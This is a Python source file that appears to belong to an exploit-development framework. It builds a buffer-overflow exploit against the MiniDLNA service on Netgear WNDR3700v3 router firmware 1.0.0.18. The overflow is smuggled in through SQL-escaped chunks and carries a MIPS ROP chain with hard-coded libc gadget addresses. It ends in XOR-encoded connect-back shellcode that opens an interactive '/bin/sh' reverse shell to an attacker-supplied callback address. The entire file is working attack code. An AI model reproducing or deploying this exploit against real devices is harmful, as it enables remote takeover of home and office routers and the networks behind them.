import signal
import os
import struct


from crossbow.overflow_development.overflowbuilder import EmptyOverflowBuffer,OverflowBuilderException
from crossbow.common.support import LittleEndian
from crossbow.common.support import Logging
from crossbow.servers.callback_server import Callback
from crossbow.payloads.mips.callback_payload import CallbackPayload
from crossbow.payloads.mips.trampoline import Trampoline
from crossbow.encoders.mips import MipsXorEncoder

class WNDR3700v3(object):
    endianness=LittleEndian
    overflow_len=2048
    #bad sql bytes and their sqlite escaped equivalents
    minidlna_badbytes={'\x20':"x'20'",
                        '\x0d':"x'0d'",
                        '\x2d':"x'2d'"}

    def __init__(self,callback_ip_address,port,target_ip_address,logger=None):
        self.logger=logger
        if not self.logger:
            self.logger=Logging()

        self.callback_server=Callback(callback_ip_address,
                                        port,
                                        startcmd="/bin/sh -i",
                                        connectback_shell=True)
        self.endianness=self.__class__.endianness
        self.overflow_len=self.__class__.overflow_len
    
    def scan_for_nulls(self):
        return self.overflow_data.scan_for_nulls()

    def chunks(self,chunklen):
        string=self.overflow_data.overflow_string

        chunks=[]
        badchar_replacements=self.minidlna_badbytes
        while len(string) > 0:
            newstring = ""
            for i in range(0,chunklen):
                if len(string) <= 0:
                    break
                newstring+=string[0]
                string=string[1:]
            for k,v in badchar_replacements.items():
                if k in newstring:
                    self.logger.LOG_DEBUG("replacing with "+v)
                    newstring=newstring.replace(k,'\"||'+v+'||\"')
            chunks.append(newstring)

        return chunks
    def find(self,find_string):
        if find_string.startswith('0x'):
            find_string=struct.pack("<L",int(find_string,16))
        return self.overflow_data.find_offset(find_string)

    def serve_callback(self):
        self.pid = self.callback_server.serve_callback()
        return self.pid

    def wait_callback(self,kill=False):
        if self.pid:
            if(kill):
                os.kill(self.pid,signal.SIGTERM)
            os.waitpid(self.pid,0)


class WNDR3700v3_10018(WNDR3700v3):
    vesion_string="1.0.0.18"
    libc_actual=0x2af34000
    libc_qemu=0x4084a000
    libavcodec_actual=0x2b0a8000
    libavcodec_qemu=0
    
    
    def build_overflow(self,target_ip_address,encoder_class=None,qemu=False):
        cls=self.__class__
        libc=0
        #libavcodec=0
        badbyte_list=['\x00']
        for k in cls.minidlna_badbytes.keys():
            badbyte_list.append(k)

        if qemu:
            libc=cls.libc_qemu
            #libavcodec=cls.libavcodec_qemu
        else:
            libc=cls.libc_actual
            #libavcodec=cls.libavcodec_actual
        
        overflow_buf=EmptyOverflowBuffer(self.endianness,default_base=libc,badchars=badbyte_list)
        
        offset_modifier=len(target_ip_address)
        print "offset_modifier: %d" % offset_modifier


        reg_s0=564-offset_modifier
        reg_s1=568-offset_modifier
        reg_s2=572-offset_modifier
        reg_s3=576-offset_modifier
        reg_s4=580-offset_modifier
        reg_s6=588-offset_modifier
        reg_ra=600-offset_modifier
        
        
        #1028, or 0x404, is the smallest operand to MIPS beq that
        #can >>2 bits and still have both bytes be non-null
        length=overflow_buf.len() #should be 0 at this point
        overflow_buf.add_pattern((16-offset_modifier)-length)
        
        trampoline_2=Trampoline(self.endianness,1028)
        overflow_buf.add_string(trampoline_2.shellcode,
                        description="Second trampoline payload, jump forward 1028 ")
                        
                        
        length=overflow_buf.len()
        overflow_buf.add_pattern(reg_s1-length)        
        #address of sleep
        overflow_buf.add_rop_gadget(0x506c0,
                        description="[reg $s1] Address of sleep() in libc. be sure to set up $ra and $a0 before calling.")

        length=overflow_buf.len()
        overflow_buf.add_pattern(reg_s3-length)
        #[reg $s3] placeholder that allows $s3 to be dereferenced without crashing.
        overflow_buf.add_rop_gadget(0x00011918,
                            description="[reg $s3] placeholder that allows $s3 to be dereferenced without crashing.")
                            
        length=overflow_buf.len()
        overflow_buf.add_pattern(reg_s4-length)
        overflow_buf.add_rop_gadget(0x0000BA84,
                            description="[reg $s4] jalr $s0")

        #load stack data into $ra, jr $s1
        length=overflow_buf.len()
        overflow_buf.add_pattern(reg_s6-length)
        overflow_buf.add_rop_gadget(0x0001D95C,
                        description="[reg $s6] setup ra before sleep(). jr $s1")
        
        #load 1 into $a0, jalr $s3
        length=overflow_buf.len()
        overflow_buf.add_pattern(reg_ra-length)
        overflow_buf.add_rop_gadget(0x00025110,
                        description="reg $ra. set up 3 sec arg to sleep(). jalr $s6.")

        #move $a2 to $s0, jalr $s4
        length=overflow_buf.len()
        overflow_buf.add_pattern((632-offset_modifier)-length)
        overflow_buf.add_rop_gadget(0x0003434C,
                        description="[reg $s0] move $a2 to $s0, jalr $s4")
                                
        #[reg $ra] offset from $sp into $a2, jalr $s1.
        length=overflow_buf.len()
        overflow_buf.add_pattern((640-offset_modifier)-length)
        overflow_buf.add_rop_gadget(0x00011918,
                description="[reg $ra] offset from $sp into $a2, jalr $s1.")


        length=overflow_buf.len()
        overflow_buf.add_pattern((684-offset_modifier)-length)
        trampoline_1=Trampoline(self.endianness,-672)
        overflow_buf.add_string(trampoline_1.shellcode,
                            description="First trampoline payload, jump back 672")

        #placeholders one and two get added together and passed as dst into memcpy(). They must add
        #up to be a writable address."
        length=overflow_buf.len()
        overflow_buf.add_pattern((736-offset_modifier)-length)
        overflow_buf.add_rop_gadget(0x15a3c932,
                base_address=0,
                description="placeholder 1 to avoid crashing memcpy.")

        length=overflow_buf.len()
        overflow_buf.add_pattern((752-offset_modifier)-length)
        overflow_buf.add_rop_gadget(0x15a3c932,
                base_address=0,
                description="placeholder 2 to avoid crashing memcpy.")

        length=overflow_buf.len()
        overflow_buf.add_pattern((1048-offset_modifier)-length)
        payload=CallbackPayload(self.callback_server,self.endianness)
        if encoder_class:
            encoded_payload=encoder_class(payload,self.endianness,badchars=badbyte_list)
            payload=encoded_payload
        
        try:
            overflow_buf.add_string(payload.shellcode,
                            description="connect-back payload")
        except OverflowBuilderException as obe:
            print payload.pretty_string()
            raise obe


        return overflow_buf

    def __init__(self,callback_ip_address,port,target_ip_address,encode=True,qemu=False,logger=None):
        super(self.__class__,self).__init__(callback_ip_address,port,target_ip_address,logger)
        self.encoder_class=None
        
        if encode:
            self.encoder_class=MipsXorEncoder
        
        self.overflow_data=self.build_overflow(target_ip_address,self.encoder_class,qemu)
        pass

class WNDR3700v3_10022(WNDR3700v3):
    pass

WNDR3700_VERSIONS={"1.0.0.18":WNDR3700v3_10018,
                    "1.0.0.22":WNDR3700v3_10022}
